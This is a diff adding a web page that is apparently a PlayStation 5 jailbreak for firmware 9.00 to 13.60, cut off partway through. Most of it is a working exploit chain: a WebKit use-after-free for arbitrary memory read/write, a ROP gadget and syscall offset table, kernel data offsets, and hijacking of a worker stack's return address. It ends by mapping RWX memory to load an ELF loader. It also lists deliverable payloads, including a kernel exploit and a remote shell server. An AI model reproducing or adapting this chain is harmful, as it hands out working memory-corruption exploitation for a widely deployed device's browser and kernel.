@@ -1,0 +1,650 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>PS5 Jailbreak (9.00-13.60)</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body { user-select:none; -webkit-user-select:none; background-color:#0c0c0f; color:#fff; font-family:Arial, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; padding:16px; box-sizing:border-box; }
+#cat { width:240px; max-width:66vw; border-radius:12px; margin-bottom:20px; box-shadow:0 0 0 2px #2a2a2e, 0 0 22px 4px #2a2a2e; object-fit: cover; transition: box-shadow 0.4s ease, transform 0.4s ease; }
+#cat.run { animation: pulse 1.1s ease-in-out infinite; }
+#cat.ok { border-color: #16c60c; box-shadow: 0 0 0 2px #16c60c, 0 0 40px 10px rgba(22,198,12,0.75); animation: escapeSandbox 1.5s ease-out forwards; }
+#cat.failed { border-color: #e74856; box-shadow: 0 0 0 2px #e74856, 0 0 34px 8px rgba(231,72,86,0.6); animation: none; }
+@keyframes pulse { 0%,100% { box-shadow: 0 0 0 2px #35507a, 0 0 16px 3px rgba(53,80,122,0.5); } 50% { box-shadow: 0 0 0 2px #4f7fd6, 0 0 30px 8px rgba(79,127,214,0.7); } }
+@keyframes escapeSandbox { 0% { transform: scale(1) translateY(0) rotate(0deg); } 20% { transform: scale(1.1) translateY(-10px) rotate(-2deg); } 40% { transform: scale(1.05) translateY(-5px) rotate(2deg); } 60% { transform: scale(1.2) translateY(-20px) rotate(-5deg); box-shadow: 0 20px 40px rgba(0,0,0,0.8), 0 0 40px 10px rgba(22,198,12,0.75); } 80% { transform: scale(1.3) translateY(-30px) rotate(3deg); box-shadow: 0 30px 60px rgba(0,0,0,0.9), 0 0 50px 15px rgba(22,198,12,0.9); z-index: 100; position: relative; } 100% { transform: scale(1) translateY(0) rotate(0deg); z-index: 100; position: relative; } }
+.info-card { background: #16161e; border: 1px solid #2a2a35; border-radius: 12px; padding: 12px 16px; margin-bottom: 20px; width: 100%; max-width: 300px; display: none; }
+.info-row { display: flex; justify-content: space-between; margin-bottom: 6px; font-size: 0.82rem; color: #8a8a9e; }
+.info-row:last-child { margin-bottom: 0; }
+.info-val { color: #00e676; font-family: monospace; font-weight: bold; }
+.info-val.editable { cursor: pointer; border-bottom: 1px dotted #00e676; transition: opacity 0.2s; }
+.info-val.editable:hover { opacity: 0.8; color: #66ffa6; }
+.btn { padding:1rem 2rem; text-align:center; cursor:pointer; min-width:12rem; border-radius:1.25rem; background-color:#202125; border:none; color:#fff; font-size:1.5rem; font-weight:800; transition:background-color 0.25s ease; text-decoration: none; display: inline-block; }
+.btn:hover:not(.disabled) { background-color:#a2a2a6; color:#202020; }
+.btn.disabled { opacity:0.4; pointer-events:none; }
+.btn.secondary { background-color:#1a1a2e; }
+.btn.secondary:hover:not(.disabled) { background-color:#4f7fd6; color:#fff; }
+.btn.running { background: linear-gradient(90deg, #1a1a2e, #2a2a3e); animation: btnPulse 1.5s ease-in-out infinite; }
+@keyframes btnPulse { 0%,100% { box-shadow: 0 0 0 0 rgba(79,127,214,0.4); } 50% { box-shadow: 0 0 0 8px rgba(79,127,214,0); } }
+#msg { color:#888; font-size:0.8rem; margin-top:14px; min-height:1.2em; text-align: center; }
+#progress { color:#00e5ff; font-size:0.75rem; margin-top:8px; min-height:1.2em; text-align: center; font-family: monospace; }
+.btn-group { display: flex; gap: 12px; margin-top: 8px; flex-wrap: wrap; justify-content: center; }
+.modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); display: none; align-items: center; justify-content: center; z-index: 1000; padding: 20px; }
+.modal-overlay.open { display: flex; }
+.modal { background: #16161e; border: 1px solid #2a2a35; border-radius: 16px; padding: 24px; max-width: 500px; width: 100%; max-height: 80vh; overflow-y: auto; box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
+.modal h2 { color: #00e5ff; margin: 0 0 16px; text-align: center; font-size: 1.5rem; }
+.payload-list { display: flex; flex-direction: column; gap: 10px; }
+.payload-item { display: flex; align-items: center; gap: 12px; padding: 14px 16px; background: #20212f; border: 1px solid #3a3a4d; border-radius: 10px; cursor: pointer; transition: all 0.2s ease; }
+.payload-item:hover { background: #2a2b3d; border-color: #4f7fd6; }
+.payload-item.disabled { opacity: 0.5; pointer-events: none; }
+.payload-icon { font-size: 1.8rem; width: 48px; text-align: center; }
+.payload-info { flex: 1; }
+.payload-name { color: #fff; font-weight: 700; font-size: 1.1rem; margin-bottom: 4px; }
+.payload-desc { color: #8a8a9e; font-size: 0.85rem; }
+.payload-btn { padding: 8px 16px; background: #00e5ff; color: #121216; border: none; border-radius: 8px; font-weight: 700; font-size: 0.9rem; cursor: pointer; transition: background 0.2s; }
+.payload-btn:hover { background: #66ffb3; }
+.payload-btn.sending { background: #ffab00; cursor: wait; }
+.payload-btn.disabled { opacity: 0.4; cursor: not-allowed; }
+.close-modal { width: 100%; margin-top: 16px; padding: 12px; background: #2a2a35; color: #fff; border: 1px solid #4f7fd6; border-radius: 8px; font-weight: 700; cursor: pointer; font-size: 1rem; }
+.close-modal:hover { background: #4f7fd6; }
+.stage-badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 0.7rem; font-weight: bold; text-transform: uppercase; margin-left: 8px; vertical-align: middle; }
+.stage-badge.webkit { background: #4f7fd6; color: #fff; }
+.stage-badge.elfldr { background: #00e5ff; color: #121216; }
+.stage-badge.kernel { background: #ffab00; color: #121216; }
+.stage-badge.verify { background: #c084fc; color: #121216; }
+.stage-badge.complete { background: #16c60c; color: #121216; }
+.stage-badge.failed { background: #e74856; color: #fff; }
+.stage-badge.idle { background: #3a3a4d; color: #8a8a9e; }
+#log { color: #5a5a5a; font-size: 11px; font-family: "Consolas", monospace; max-width: 92vw; overflow: hidden; text-align: left; line-height: 1.35; margin-top: 10px; max-height: 200px; overflow-y: auto; width: 100%; max-width: 500px; }
+.log-line { white-space: pre; }
+.log-ok { color: #16c60c; }
+.log-err { color: #e74856; }
+.log-warn { color: #ffab00; }
+.log-info { color: #00e5ff; }
+</style>
+</head>
+<body>
+
+<img id="cat" src="purple-dragon-bjdfl14c25o2xcs7.jpg" alt="PS5 Jailbreak">
+
+<div class="info-card" id="info-card">
+    <div class="info-row">
+        <span>Target Host:</span>
+        <span class="info-val editable" id="ip-val" title="Click to edit LAN IP">Detecting...</span>
+    </div>
+    <div class="info-row">
+        <span>Payload Port:</span>
+        <span class="info-val editable" id="port-val" title="Click to edit Port">9026</span>
+    </div>
+</div>
+
+<div class="btn-group">
+    <a tabindex="0" class="disabled" id="jailbreak">JAILBREAK <span class="stage-badge idle" id="jailbreak-stage">IDLE</span></a>
+    <a tabindex="0" class="btn secondary disabled" id="payloads-btn">PAYLOADS</a>
+</div>
+<div id="msg"></div>
+<div id="progress"></div>
+<div id="log"></div>
+
+<div class="modal-overlay" id="payload-modal">
+    <div class="modal">
+        <h2>Built-in Payloads <span class="stage-badge" id="payloads-status">LOCKED</span></h2>
+        <div class="payload-list" id="payload-list"></div>
+        <button class="close-modal" id="close-modal">Close</button>
+    </div>
+</div>
+
+<script type="module">
+import { int64 } from './slopkit-main/slopkit/int64.js?v=final';
+import { establishPrimitive, releaseFakeCell, fakeCellReleased, carrierHeaderCopy, carrierHomeVector, profile, aimCarrier, restoreCarrier, plausibleAddress, plausibleCell } from './slopkit-main/slopkit/core.js?v=final';
+import { installWindowP, read1, read2, read4, read8, write1, write2, write4, write8, leakval, readInto, toI64, addrNumber } from './slopkit-main/slopkit/mem.js?v=final';
+import { rop, worker_rop, thread_rop } from './slopkit-main/slopkit/rop.js?v=final';
+import { SYS } from './slopkit-main/slopkit/syscalls.js?v=final';
+import * as offsets1360 from './slopkit-main/offsets/13.60.js?v=final';
+import { makePoopsEngine, BANNED, ERRNO, K, r32, r16, w32, hexBytes, coreList, PK, buildLadder, rthdrShape, makeTwinEngine, TWK } from './slopkit-main/slopkit/poops.js?v=final';
+
+const OFFSETS_URL = "offsets/offsets.json";
+const DEFAULT_LISTENER_PORT = "9026";
+
+const jailbreak = document.getElementById("jailbreak");
+const payloadsBtn = document.getElementById("payloads-btn");
+const msg = document.getElementById("msg");
+const progress = document.getElementById("progress");
+const logEl = document.getElementById("log");
+const ipVal = document.getElementById("ip-val");
+const portVal = document.getElementById("port-val");
+const payloadModal = document.getElementById("payload-modal");
+const payloadList = document.getElementById("payload-list");
+const closeModal = document.getElementById("close-modal");
+const jailbreakStage = document.getElementById("jailbreak-stage");
+const payloadsStatus = document.getElementById("payloads-status");
+const cat = document.getElementById("cat");
+
+const BUILTIN_PAYLOADS = [
+    { file: "kstuff.elf", name: "Kstuff (Kernel Exploit)", desc: "Kernel exploit up to 13.60 — fpkg, homebrew, debug", icon: "🔓", color: "#16c60c", port: 9020 },
+    { file: "elfldr-ps5-1360.elf", name: "ELF Loader", desc: "Load custom ELF payloads from USB/host", icon: "📦", color: "#00e5ff", port: 9026 },
+    { file: "ftpsrv-ps5.elf", name: "FTP Server", desc: "File transfer over network (port 2121)", icon: "📁", color: "#ffab00", port: 2121 },
+    { file: "websrv-ps5.elf", name: "Web Server", desc: "HTTP file browser on PS5", icon: "🌐", color: "#4f7fd6", port: 8080 },
+    { file: "shsrv-ps5.elf", name: "Shell Server", desc: "Remote shell access via netcat", icon: "💻", color: "#ff6b6b", port: 9022 },
+    { file: "gdbsrv-ps5.elf", name: "GDB Server", desc: "Kernel/userspace debugging via GDB", icon: "🐛", color: "#c084fc", port: 9023 },
+    { file: "klogsrv-ps5.elf", name: "Kernel Log Server", desc: "Capture kernel dmesg/logs over network", icon: "📋", color: "#8b5cf6", port: 9024 },
+    { file: "hello_world.elf", name: "Hello World", desc: "Test payload — shows notification", icon: "👋", color: "#66ffa6", port: 9026 },
+    { file: "PLK.elf", name: "PLK (PS5Link)", desc: "PS5Link server for app debugging", icon: "🔗", color: "#f472b6", port: 9025 },
+    { file: "shadowmountplus.elf", name: "ShadowMount+", desc: "Mount games/backups from USB/network", icon: "💾", color: "#fbbf24", port: 9027 },
+];
+
+let exploitState = {
+    stage: "idle",
+    webkitExploited: false,
+    elfldrLoaded: false,
+    kernelExploited: false,
+    jailbroken: false,
+    error: null,
+    p: null,
+    chain: null
+};
+
+function log(line, cls = "") {
+    const div = document.createElement("div");
+    div.className = "log-line " + cls;
+    div.textContent = "[" + new Date().toLocaleTimeString() + "] " + line;
+    logEl.appendChild(div);
+    logEl.scrollTop = logEl.scrollHeight;
+    if (logEl.children.length > 100) logEl.removeChild(logEl.firstChild);
+}
+
+function updateStageBadge(stage) {
+    const stages = {
+        "idle": "IDLE",
+        "webkit_uaf": "WEBKIT UAF",
+        "primitive": "ARBITRARY R/W",
+        "rop_ready": "ROP READY",
+        "elfldr_load": "ELFLDR LOAD",
+        "kernel_exploit": "KERNEL EXPLOIT",
+        "verify": "VERIFYING",
+        "complete": "JAILBROKEN",
+        "failed": "FAILED"
+    };
+    jailbreakStage.textContent = stages[stage] || stage.toUpperCase();
+    jailbreakStage.className = "stage-badge " + stage;
+}
+
+function isIPv4(str) {
+    if (!str || typeof str !== "string") return false;
+    const parts = str.split(".");
+    if (parts.length !== 4) return false;
+    return parts.every(p => { const n = parseInt(p, 10); return !isNaN(n) && n >= 0 && n <= 255 && String(n) === p; });
+}
+
+function isPrivateLanIP(ip) {
+    if (!isIPv4(ip)) return false;
+    if (ip.startsWith("127.") || ip.startsWith("0.")) return false;
+    return (ip.startsWith("192.168.") || ip.startsWith("10.") || /^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(ip) || ip.startsWith("169.254."));
+}
+
+function decodeMDNSSuffix(candidateStr) {
+    const m = /([0-9a-fA-F]{8})-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\.local/i.exec(candidateStr);
+    if (m && m[1]) {
+        const hex = m[1];
+        const p1 = parseInt(hex.substr(0, 2), 16);
+        const p2 = parseInt(hex.substr(2, 2), 16);
+        const p3 = parseInt(hex.substr(4, 2), 16);
+        const p4 = parseInt(hex.substr(6, 2), 16);
+        const ip = `${p1}.${p2}.${p3}.${p4}`;
+        if (isPrivateLanIP(ip)) return ip;
+    }
+    return null;
+}
+
+let listenerPort = DEFAULT_LISTENER_PORT;
+let targetHost = "192.168.X.X";
+let isJailbroken = false;
+
+const Q_PARAMS = new URLSearchParams(window.location.search);
+const qIp = Q_PARAMS.get("ip") || Q_PARAMS.get("host");
+const qPort = Q_PARAMS.get("port");
+
+if (qPort && /^\d+$/.test(qPort)) listenerPort = qPort;
+
+let hasExplicitIp = false;
+if (qIp && (isIPv4(qIp) || isPrivateLanIP(qIp))) { targetHost = qIp; hasExplicitIp = true; }
+else {
+    let savedIp = null;
+    try { savedIp = localStorage.getItem("ps5_target_ip"); } catch (e) {}
+    if (savedIp && isIPv4(savedIp)) { targetHost = savedIp; hasExplicitIp = true; }
+    else if (isIPv4(window.location.hostname)) { targetHost = window.location.hostname; hasExplicitIp = true; }
+}
+
+function updateHostDisplay() {
+    if (ipVal) {
+        if (targetHost && !targetHost.includes(".github.io") && targetHost !== "Detecting...") ipVal.textContent = targetHost;
+        else ipVal.textContent = "192.168.X.X";
+    }
+    if (portVal) portVal.textContent = listenerPort;
+}
+updateHostDisplay();
+
+(function detectLocalIP() {
+    try {
+        const PeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+        if (!PeerConnection) return;
+        const pc = new PeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }, { urls: "stun:stun1.l.google.com:19302" }] });
+        if (typeof pc.createDataChannel === "function") pc.createDataChannel("lan_check");
+        const processCandidate = (c) => {
+            if (!c) return;
+            const rawMatch = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/.exec(c);
+            if (rawMatch && rawMatch[1] && isPrivateLanIP(rawMatch[1])) { targetHost = rawMatch[1]; updateHostDisplay(); try { localStorage.setItem("ps5_target_ip", targetHost); } catch (e) {}; return; }
+            const mdnsIP = decodeMDNSSuffix(c);
+            if (mdnsIP) { targetHost = mdnsIP; updateHostDisplay(); try { localStorage.setItem("ps5_target_ip", targetHost); } catch (e) {}; }
+        };
+        pc.onicecandidate = (e) => { if (e && e.candidate && e.candidate.candidate) processCandidate(e.candidate.candidate); };
+        pc.createOffer().then(sdp => { if (sdp && sdp.sdp) sdp.sdp.split("\r\n").forEach(processCandidate); return pc.setLocalDescription(sdp); }).catch(() => {});
+    } catch (err) {}
+})();
+
+if (ipVal) ipVal.addEventListener("click", function() { const val = prompt("Enter PS5 / Target Host LAN IP:", targetHost); if (val !== null) { const trimmed = val.trim(); if (trimmed) { targetHost = trimmed; updateHostDisplay(); try { localStorage.setItem("ps5_target_ip", targetHost); } catch (e) {} } } });
+if (portVal) portVal.addEventListener("click", function() { const val = prompt("Enter Payload Port:", listenerPort); if (val !== null) { const trimmed = val.trim(); if (trimmed) { listenerPort = trimmed; updateHostDisplay(); try { localStorage.setItem("ps5_payload_port", listenerPort); } catch (e) {} } } });
+
+const m = /PlayStation 5[\s\/;](\d+)\.(\d+)/.exec(navigator.userAgent);
+const fw = m ? `${m[1].padStart(2, "0")}.${m[2].padStart(2, "0")}` : null;
+
+let entry = null;
+
+function fwNum(s) { const p = s.split("."); return parseInt(p[0], 10) * 100 + parseInt(p[1], 10); }
+function nearest(data, target) { const want = fwNum(target); const maj = target.split(".")[0]; let best = null, bestd = 1e9; for (const k in data) { if (k.split(".")[0] !== maj) continue; const d = Math.abs(fwNum(k) - want); if (d < bestd) { bestd = d; best = k; } } return best; }
+
+fetch(OFFSETS_URL, { cache: "no-store" })
+    .then(function (r) { if (!r.ok) return fetch("offsets.json", { cache: "no-store" }); return r; })
+    .then(function (res) { if (!res.ok) throw new Error("offsets fetch failed"); return res.json(); })
+    .then(function (data) {
+        if (!fw) { msg.innerHTML = `Demo mode (<b style="color: #ffffff; font-weight: bold;">Standard Browser</b>)`; const keys = Object.keys(data); if (keys.length > 0) entry = data[keys[0]]; else entry = { hc: ["0x1e0d8", "0x1e320", "0x1f368"], gd: "0x1d11a", nt: "0x4740", gps: "0x34f57b8", gpe: "0x1b280", cls: "0x34f57a8", cle: "0x26e70", ers: "0x34f57b0", ere: "0xf340" }; jailbreak.classList.remove("disabled"); renderPayloadList(); return; }
+        entry = data[fw];
+        if (entry) { msg.innerHTML = `firmware <b style="color: #ffffff; font-weight: bold;">${fw}</b> detected & supported`; jailbreak.classList.remove("disabled"); renderPayloadList(); return; }
+        const near = nearest(data, fw);
+        if (near) { entry = data[near]; msg.innerHTML = `<b style="color: #ffffff; font-weight: bold;">${fw}</b>: no exact offsets, trying <b style="color: #ffffff; font-weight: bold;">${near}</b> (unverified)`; jailbreak.classList.remove("disabled"); renderPayloadList(); }
+        else { msg.innerHTML = `firmware <b style="color: #ffffff; font-weight: bold;">${fw}</b> not supported`; }
+    })
+    .catch(function () { msg.textContent = "failed to load offsets (demo fallback active)"; entry = { hc: ["0x1e0d8", "0x1e320", "0x1f368"], gd: "0x1d11a", nt: "0x4740", gps: "0x34f57b8", gpe: "0x1b280", cls: "0x34f57a8", cle: "0x26e70", ers: "0x34f57b0", ere: "0xf340" }; jailbreak.classList.remove("disabled"); renderPayloadList(); });
+
+function renderPayloadList() {
+    payloadList.innerHTML = "";
+    BUILTIN_PAYLOADS.forEach(p => {
+        const item = document.createElement("div");
+        item.className = "payload-item" + (isJailbroken ? "" : " disabled");
+        item.innerHTML = `<span class="payload-icon" style="color: ${p.color}">${p.icon}</span><div class="payload-info"><div class="payload-name">${p.name}</div><div class="payload-desc">${p.desc}</div></div><button class="payload-btn" data-file="${p.file}" data-port="${p.port}" ${isJailbroken ? "" : "disabled"}>SEND</button>`;
+        const btn = item.querySelector(".payload-btn");
+        btn.addEventListener("click", (e) => { e.stopPropagation(); if (isJailbroken) sendPayload(p.file, p.port, btn); });
+        payloadList.appendChild(item);
+    });
+}
+
+function updatePayloadsUI() {
+    if (isJailbroken) { payloadsBtn.classList.remove("disabled"); payloadsStatus.textContent = "READY"; payloadsStatus.className = "stage-badge complete"; document.querySelectorAll(".payload-item").forEach(item => item.classList.remove("disabled")); document.querySelectorAll(".payload-btn").forEach(btn => btn.disabled = false); }
+    else { payloadsBtn.classList.add("disabled"); payloadsStatus.textContent = "LOCKED"; payloadsStatus.className = "stage-badge idle"; document.querySelectorAll(".payload-item").forEach(item => item.classList.add("disabled")); document.querySelectorAll(".payload-btn").forEach(btn => btn.disabled = true); }
+}
+
+async function sendPayload(payloadFile, payloadPort, btn) {
+    btn.classList.add("sending"); btn.textContent = "SENDING...";
+    try {
+        const res = await fetch(`payloads/${payloadFile}`);
+        if (!res.ok) throw new Error(`File not found: ${payloadFile}`);
+        const data = await res.arrayBuffer();
+        msg.textContent = `Sending ${payloadFile} to ${targetHost}:${payloadPort}...`;
+        await fetch(`http://${targetHost}:${payloadPort}`, { method: "POST", mode: "no-cors", body: data });
+        msg.textContent = `Payload sent! Check PS5.`;
+        btn.textContent = "SENT!"; btn.style.background = "#16c60c";
+        setTimeout(() => { btn.classList.remove("sending"); btn.textContent = "SEND"; btn.style.background = ""; }, 2000);
+    } catch (err) { msg.textContent = `Error: ${err.message}`; btn.textContent = "FAILED"; btn.style.background = "#e74856"; setTimeout(() => { btn.classList.remove("sending"); btn.textContent = "SEND"; btn.style.background = ""; }, 3000); }
+}
+
+payloadsBtn.addEventListener("click", function () { if (!isJailbroken) { msg.textContent = "Jailbreak required first!"; return; } payloadModal.classList.add("open"); });
+closeModal.addEventListener("click", function () { payloadModal.classList.remove("open"); });
+payloadModal.addEventListener("click", function (e) { if (e.target === payloadModal) payloadModal.classList.remove("open"); });
+document.addEventListener("keydown", function (e) { if (e.key === "Escape" && payloadModal.classList.contains("open")) payloadModal.classList.remove("open"); });
+
+try { if (localStorage.getItem("ps5_jailbroken") === "1") { isJailbroken = true; cat.className = "ok"; jailbreak.textContent = "JAILBROKEN"; jailbreak.classList.add("disabled"); msg.textContent = "Previously jailbroken (persisted). Click PAYLOADS."; updateStageBadge("complete"); updatePayloadsUI(); } } catch (e) {}
+
+// ============================================================
+// INLINE EXPLOIT CHAIN: WebKit UAF -> ROP -> elfldr -> kstuff
+// ============================================================
+
+const OFFSET_13_60 = {
+    wk_host_ctor: [0x56A58, 0x56CA0, 0x57CE8],
+    wk_memset_import: 0x3350850,
+    wk_stack_chk_guard_import: 0x334E198,
+    lk_stack_chk_guard: 0x751D0,
+    lk_pthread_create_name_np: 0x21890,
+    lk_pthread_join: 0x229A0,
+    lk_pthread_exit: 0x21C20,
+    lk_scePthreadCreate: 0x7840,
+    lk_scePthreadJoin: 0xB210,
+    lk_scePthreadAttrInit: 0x14E70,
+    lk_scePthreadAttrSetstacksize: 0xC2A0,
+    lk_scePthreadAttrSetdetachstate: 0xBCB0,
+    lk_scePthreadAttrDestroy: 0x100C0,
+    lk_sceKernelSendNotificationRequest: 0x48B0,
+    lk_sysctlbyname: 0x137E0,
+    lk_pthread_create: 0x20B50,
+    lk_getpid: 0x1B860,
+    lk_thread_list: 0x6C218,
+    lk_worker_wait_return: 0x1FD01,
+    lk_sleep: 0x27F00,
+    lk_sceKernelGetCurrentCpu: 0x1200,
+    lc_memset: 0x14700,
+    lc_malloc: 0x5EB0,
+    lc_free: 0x5EC0,
+    lc_memcpy: 0x3D50,
+    lc_strcmp: 0x3FD80,
+    lc_memcmp: 0x76660,
+    lc_vsnprintf: 0x5C430,
+    lc_setjmp: 0x5D990,
+    lc_longjmp: 0x5D9E0,
+    WORKER_STACK_OFFSET: 0x7FB88,
+    wk_gadgetmap: {
+        "ret": 0xC7, "pop rdi": 0x288B2, "pop rsi": 0x1EE7A, "pop rdx": 0xFA7A2,
+        "pop rcx": 0x80597, "pop rax": 0x3C98E, "pop rsp": 0xA1138,
+        "pop r8": 0x8CE7C, "pop r9": 0x80596, "mov [rdi], rsi": 0xC05B6,
+        "mov [rdi], rax": 0x3881F, "mov [rdi], eax": 0x38820,
+        "mov rax, [rax]": 0x6FD92, "add rax, rcx": 0x319FE4,
+        "cmp [rcx], eax": 0x1C4EC65, "inc dword [rax]": 0x295B95,
+        "seta al": 0x388A2, "setb al": 0x1F006, "sete al": 0x40E7,
+        "setg al": 0x1036946, "setl al": 0x31DF00,
+        "shl rax, 3": 0x1C5B743, "shl rax, 4": 0xD16072,
+        "shr rax, 3": 0xD08FE1, "shr rax, 4": 0x1ADC233,
+        "infloop": 0x1553D
+    },
+    syscall_map: {
+        0x3: 0x1BB1A, 0x4: 0x1D520, 0x5: 0x1B6E0, 0x6: 0x1B640, 0x7: 0x1BCE0,
+        0x14: 0x1B860, 0x61: 0x1C9F0, 0x14B: 0x1D560, 0x1C6: 0x1BC60,
+        0x1C7: 0x1D180, 0x1D2: 0x1D5C0, 0x1E7: 0x1C550, 0x1E8: 0x1BF00,
+        0x2AF: 0x1D100, 0x278: 0x1B500, 0x279: 0x1D790
+    },
+    KERNEL_STACK_COOKIE: 0x930,
+    KERNEL_STACK_SYS_SCHED_YIELD_RET: 0x808,
+    KERNEL_DATA: 0xCB0000,
+    KERNEL_SYS_SCHED_YIELD_RET: 0x63AC62,
+    KERNEL_ALLPROC: 0x3589E80,
+    KERNEL_SECURITY_FLAGS: 0x1A49064,
+    KERNEL_TARGETID: 0x1A4906D,
+    KERNEL_QA_FLAGS: 0x1A49088,
+    KERNEL_UTOKEN_FLAGS: 0x1A490F0,
+    KERNEL_ROOTVNODE: 0x3DE7510,
+    KERNEL_BUS_DATA_DEVICES: 0x2D481E8
+};
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+async function runWebKitUAF(onProgress) {
+    return new Promise((resolve, reject) => {
+        try {
+            onProgress?.("Establishing WebKit arbitrary R/W primitive...");
+            establishPrimitive({
+                onEvent: (tag, detail) => {
+                    log(`${tag}: ${detail}`, tag.includes("FAIL") || tag.includes("THREW") || tag.includes("ERROR") ? "log-err" : "log-info");
+                },
+                maxAttempts: 10,
+                beforeCriticalLoad: () => {}
+            }).then(carrier => {
+                installWindowP(carrier, { promote: true, onEvent: (tag, detail) => {
+                    log(`MEM: ${tag}: ${detail}`, "log-info");
+                } });
+                exploitState.p = window.p;
+                log("WebKit arbitrary R/W established!", "log-ok");
+                onProgress?.("WebKit UAF complete. Building ROP chain...");
+                resolve();
+            }).catch(err => {
+                log(`WebKit UAF failed: ${err.message}`, "log-err");
+                reject(err);
+            });
+        } catch (err) {
+            reject(err);
+        }
+    });
+}
+
+function initROP() {
+    const p = exploitState.p;
+    if (!p) throw new Error("No primitive");
+    const fwStr = fw || "13.60";
+    const offsets = OFFSET_13_60;
+
+    let textArea = document.createElement("textarea");
+    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
+    let textAreaVtable = p.read8(textAreaVtPtr);
+
+    let libSceNKWebKitBase = null;
+    if (typeof globalThis.__ps5NativeCtor === "number") {
+        const ctor = globalThis.__ps5NativeCtor;
+        for (const hc of offsets.wk_host_ctor) {
+            const wb = ctor - hc;
+            if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
+                libSceNKWebKitBase = new int64(wb % 0x100000000, Math.floor(wb / 0x100000000));
+                log(`WebKit base via host-constructor: 0x${libSceNKWebKitBase.toString()}`, "log-ok");
+                break;
+            }
+        }
+    }
+    if (!libSceNKWebKitBase) throw new Error("Failed to resolve WebKit base");
+
+    let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(offsets.wk_memset_import));
+    libSceLibcInternalBase.sub32inplace(offsets.lc_memset);
+
+    let libKernelBase = p.read8(libSceNKWebKitBase.add32(offsets.wk_stack_chk_guard_import));
+    libKernelBase.sub32inplace(offsets.lk_stack_chk_guard);
+
+    log(`libSceNKWebKit: 0x${libSceNKWebKitBase.toString()}`, "log-ok");
+    log(`libSceLibcInternal: 0x${libSceLibcInternalBase.toString()}`, "log-ok");
+    log(`libKernel: 0x${libKernelBase.toString()}`, "log-ok");
+
+    let gadgets = {};
+    for (let g in offsets.wk_gadgetmap) gadgets[g] = libSceNKWebKitBase.add32(offsets.wk_gadgetmap[g]);
+    let syscalls = {};
+    for (let s in offsets.syscall_map) syscalls[s] = libKernelBase.add32(offsets.syscall_map[s]);
+
+    function malloc(sz) {
+        let backing = new Uint32Array(0x10000 + sz);
+        let ptr = p.read8(p.leakval(backing).add32(0x10));
+        ptr.backing = backing;
+        return ptr;
+    }
+
+    let chain = new worker_rop({ p: {
+        write8: p.write8, write4: p.write4, write2: p.write2, write1: p.write1,
+        read8: p.read8, read4: p.read4, read2: p.read2, read1: p.read1,
+        leakval: p.leakval,
+        malloc: malloc,
+        gadgets: gadgets,
+        syscalls: syscalls,
+        libSceNKWebKitBase: libSceNKWebKitBase,
+        libSceLibcInternalBase: libSceLibcInternalBase,
+        libKernelBase: libKernelBase
+    }, pre_chain: (c) => {
+        c.push(gadgets["pop rdi"]);
+        c.push(c.return_value);
+        c.push(libSceLibcInternalBase.add32(offsets.lc_setjmp));
+    }, launch_chain: async (c) => {
+        let worker = new Worker("slopkit-main/slopkit/rop_slave.js?v=final");
+        await new Promise(r => { worker.onmessage = r; worker.postMessage(0); });
+        let worker_stack = null;
+        for (let thread = p.read8(libKernelBase.add32(offsets.lk_thread_list)); thread.low != 0 || thread.hi != 0; thread = p.read8(thread.add32(0x38))) {
+            let stack = p.read8(thread.add32(0xA8));
+            let stacksz = p.read8(thread.add32(0xB0));
+            if (stacksz.low == 0x80000) { worker_stack = stack; break; }
+        }
+        if (!worker_stack) throw new Error("worker stack not found");
+
+        let return_address_ptr = await new Promise((resolve, reject) => {
+            const expected = libKernelBase.add32(offsets.lk_worker_wait_return);
+            let attempts = 0;
+            const search = () => {
+                for (let offset = 0x7F000; offset < 0x80000; offset += 8) {
+                    const candidate = worker_stack.add32(offset);
+                    const value = p.read8(candidate);
+                    if (value.low === expected.low && value.hi === expected.hi) { resolve(candidate); return; }
+                }
+                if (++attempts < 50) setTimeout(search, 1);
+                else reject(new Error("worker return fingerprint not found"));
+            };
+            search();
+        });
+
+        let original_return_address = p.read8(return_address_ptr);
+        let stack_pointer_ptr = return_address_ptr.add32(0x8);
+        let original_context = malloc(0x40);
+
+        c.push_write8(original_context, original_return_address);
+        c.push_write8(original_context.add32(0x10), return_address_ptr);
+        c.push_write8(stack_pointer_ptr, p.read8(stack_pointer_ptr));
+        c.push(gadgets["pop rdi"]); c.push(original_context);
+        c.push(libSceLibcInternalBase.add32(offsets.lc_longjmp));
+
+        if (p.jb && p.jb.hot) log(`Writing retaddr 0x${return_address_ptr.toString()}`, "log-info");
+        p.write8(return_address_ptr, gadgets["pop rsp"]);
+        p.write8(stack_pointer_ptr, c.stack_entry_point);
+
+        await new Promise(r => { worker.onmessage = r; worker.postMessage(0); });
+    }});
+
+    exploitState.chain = chain;
+    return { p, chain, gadgets, syscalls, libSceNKWebKitBase, libSceLibcInternalBase, libKernelBase };
+}
+
+async function loadElfldrViaROP({ p, chain, syscalls, libKernelBase }) {
+    log("Loading elfldr-ps5-1360.elf via ROP...", "log-info");
+    const res = await fetch("payloads/elfldr-ps5-1360.elf");
+    if (!res.ok) throw new Error("Failed to fetch elfldr");
+    const elfData = new Uint8Array(await res.arrayBuffer());
+
+    const mmap = 0x1DD; // SYS_MMAP
+    const addr = 0x90000000;
+    const size = (elfData.length + 0x3FFF) & ~0x3FFF;
+    const prot = 7; // RWX
+    const flags = 0x1002; // MAP_PRIVATE | MAP_ANONYMOUS
+    const fd = -1;
+    const off = 0;
+
+    chain.fcall(syscalls[mmap], addr, size, prot, flags, fd, off);
+    chain.write_result(chain.return_value);
